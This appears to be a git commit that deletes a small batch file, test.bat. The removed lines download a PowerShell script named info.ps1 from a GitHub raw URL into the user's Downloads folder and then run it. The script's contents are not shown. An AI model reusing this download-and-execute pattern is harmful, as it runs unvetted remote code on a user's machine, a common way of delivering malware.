7fb4a41ef5f3e7c776116f596cf4d1dd1fe85847
louist12 <114141279+louist12@users.noreply.github.com>
2022-10-06 12:33:50 +0530

    Delete test.bat

--- test.bat
+++
@@ -1,2 +0,0 @@
-powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/louist12/testing/main/info.ps1 -OutFile C:\Users\%username%\downloads\d.ps1"
-powershell -Command "C:\Users\%username%\downloads\d.ps1"
